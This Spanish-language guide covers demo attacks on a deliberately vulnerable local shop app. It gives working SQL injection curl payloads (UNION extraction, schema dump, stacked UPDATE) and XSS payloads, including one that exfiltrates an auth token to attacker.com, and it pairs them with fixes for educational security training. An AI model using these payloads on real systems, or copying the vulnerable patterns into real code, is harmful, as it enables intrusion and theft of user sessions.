# Guía de Ataques Demo — La Taberna del Gato

> **Contexto:** Estos ataques funcionan contra la aplicación local levantada con `docker-compose`.
> Todo el código vulnerable es **intencional** con fines educativos.

## Prerrequisitos

```bash
docker-compose up --build
```

Servicios disponibles:
- Frontend: http://localhost:3000
- Backend API: http://localhost:8080/api

---

## 1. SQL Injection

### Dónde está la vulnerabilidad

`ProductController.java:104` — El endpoint de búsqueda concatena el parámetro `q` directamente en la query SQL:

```java
String query = "SELECT * FROM products WHERE name LIKE '%" + q + "%' " +
               "OR description LIKE '%" + q + "%'";
```

### Ataque 1: Extraer todos los registros (bypass de filtro)

**Desde el navegador** — escribir en el buscador del frontend:

```
' OR '1'='1
```

**Desde curl:**

```bash
curl -G "http://localhost:8080/api/products/search" \
  --data-urlencode "q=' OR '1'='1"
```

La query resultante en el servidor será:
```sql
SELECT * FROM products WHERE name LIKE '%' OR '1'='1%'
OR description LIKE '%' OR '1'='1%'
```
Devuelve todos los productos sin importar el filtro.

### Ataque 2: Inyectar datos ficticios (UNION con literales)

Demuestra que se puede inyectar cualquier dato en la respuesta:

```bash
curl -G "http://localhost:8080/api/products/search" \
  --data-urlencode "q=x' UNION SELECT 99, 'PRODUCTO INYECTADO', 'descripcion falsa', 9.99, 0, 'hack', 0, NOW()--"
```

La respuesta incluirá un "producto" inventado con esos valores exactos, prueba de ejecución arbitraria de SQL.

### Ataque 3: Extraer datos de otra tabla (UNION-based)

La BD tiene una tabla `reviews` con texto de usuarios. Con UNION se extrae:

```bash
curl -G "http://localhost:8080/api/products/search" \
  --data-urlencode "q=x' UNION SELECT id, CAST(product_id AS VARCHAR), text, CAST(rating AS DECIMAL), NULL, NULL, NULL, NULL FROM reviews--"
```

Devuelve todas las reseñas disfrazadas de productos. En un caso real, esta técnica se usa para extraer usuarios, contraseñas, tokens, etc.

> **Nota sobre `orders`:** La tabla existe en el esquema pero `buyProduct()` nunca inserta en ella — es otro bug. Se puede verificar con:
> ```bash
> curl -G "http://localhost:8080/api/products/search" \
>   --data-urlencode "q=x' UNION SELECT COUNT(*), 'filas en orders', NULL, NULL, NULL, NULL, NULL, NULL FROM orders--"
> ```

### Ataque 4: Obtener el esquema completo de la BD

```bash
curl -G "http://localhost:8080/api/products/search" \
  --data-urlencode "q=x' UNION SELECT NULL, TABLE_NAME, COLUMN_NAME, NULL, NULL, DATA_TYPE, NULL, NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='PUBLIC'--"
```

Devuelve todas las tablas y columnas de la BD. Primer paso real de un atacante para mapear la base de datos antes de extraer datos sensibles.

### Por qué funciona

El servidor incluso **loguea la query completa** con el input del usuario (`ProductController.java:107`):
```java
logger.debug("Ejecutando query: " + query);
```

Si tienes acceso a los logs del contenedor puedes verlo en tiempo real:
```bash
docker-compose logs -f backend
```

### La fix correcta sería

Usar `PreparedStatement` o el método parametrizado de `JdbcTemplate`:
```java
// Correcto
jdbcTemplate.queryForList(
    "SELECT * FROM products WHERE name LIKE ?", "%" + q + "%"
);
```

---

## 2. XSS (Cross-Site Scripting)

### Dónde está la vulnerabilidad

`ProductList.jsx:169` — Las descripciones de productos se renderizan directamente como HTML:

```jsx
<div
    className="product-description"
    dangerouslySetInnerHTML={{ __html: product.description }}
/>
```

También en línea 173 (nombre), 199 (reseñas), 235-237 (modal de detalle).

Los datos vienen del backend sin ningún tipo de sanitización.

### Ataque 1: XSS Stored vía reseña

Abrir cualquier producto → "Ver detalles" → escribir en el campo de reseña:

```html
<img src=x onerror="alert('XSS: '+document.cookie)">
```

Al enviar la reseña, queda guardada en la base de datos. **Cada usuario que cargue esa página verá el alert.**

> Ya hay una reseña de demostración con XSS en `data.sql:50`:
> ```sql
> INSERT INTO reviews (...) VALUES (5, 'Se lo comio en 2 dias <img src=x onerror=console.log("xss-test")>', 3);
> ```
> Abre http://localhost:3000 y mira la consola del navegador — verás `xss-test` ya ejecutado.

### Ataque 2: Robar el token de autenticación

El token de sesión se guarda en `localStorage` (`Header.jsx`). Con XSS se puede exfiltrar:

```html
<img src=x onerror="fetch('http://attacker.com/steal?token='+localStorage.getItem('authToken'))">
```

En un entorno real, esto enviaría el token a un servidor controlado por el atacante.

**Para demostrarlo sin servidor externo**, usar un endpoint local. En la consola del navegador puedes simular el efecto:

```javascript
// Simula lo que haría el payload XSS
console.log('Token robado:', localStorage.getItem('authToken'));
```

### Ataque 3: Redirección a página de phishing

```html
<script>document.location='http://evil-taberna-del-gato.com/login'</script>
```

O sin `<script>` (para evadir filtros básicos):

```html
<img src=x onerror="window.location='http://evil.com'">
```

### Ataque 4: Inyectar via SQL Injection + XSS (combinado)

Primero inyectamos datos maliciosos en la BD con SQL Injection, luego el frontend los renderiza:

```bash
# Actualizamos la descripción de un producto con payload XSS vía SQLi
curl -G "http://localhost:8080/api/products/search" \
  --data-urlencode "q=x'; UPDATE products SET description='<script>alert(\"SQLi+XSS combinado\")</script>' WHERE id=1;--"
```

> **Nota H2:** H2 puede no ejecutar múltiples statements en una sola query dependiendo de la configuración. Si no funciona el UPDATE, el ataque de lectura (UNION) sí funcionará siempre.

### Por qué funciona

El comentario en `ProductList.jsx:164` lo dice explícitamente:
```jsx
{/* VULNERABILIDAD XSS: dangerouslySetInnerHTML sin sanitizar */}
{/* Un atacante puede inyectar: <script>document.location='...'</script> */}
```

### La fix correcta sería

Usar una librería de sanitización antes de renderizar:
```bash
npm install dompurify
```
```jsx
import DOMPurify from 'dompurify';

<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(product.description) }} />
```

O mejor aún, evitar `dangerouslySetInnerHTML` y renderizar como texto plano:
```jsx
<div>{product.description}</div>
```

---

## Resumen de superficies de ataque

| Vulnerabilidad | Endpoint / Archivo | Línea | Impacto |
|---|---|---|---|
| SQL Injection | `GET /api/products/search?q=` | Controller:104 | Lectura completa de BD (orders vacía — bug extra) |
| SQL Injection | `GET /api/products/{id}` | Controller:128 | Lectura/modificación |
| XSS Stored | Reseñas (modal de producto) | ProductList:199 | Robo de sesión, phishing |
| XSS Reflected | Cualquier `dangerouslySetInnerHTML` | ProductList:169,173 | Ejecución JS arbitrario |
| Credenciales expuestas | `ProductController.java:28-30` | Hardcoded | Acceso a Stripe, admin API |
| Token admin sin auth real | `DELETE /api/admin/products/{id}` | Controller:193 | Borrado de productos |

---

## Ver logs en tiempo real

```bash
# Ver queries SQL ejecutadas (incluyendo las inyectadas)
docker-compose logs -f backend | grep -E "(query|SQL|Ejecutando)"

# Ver todos los logs
docker-compose logs -f
```
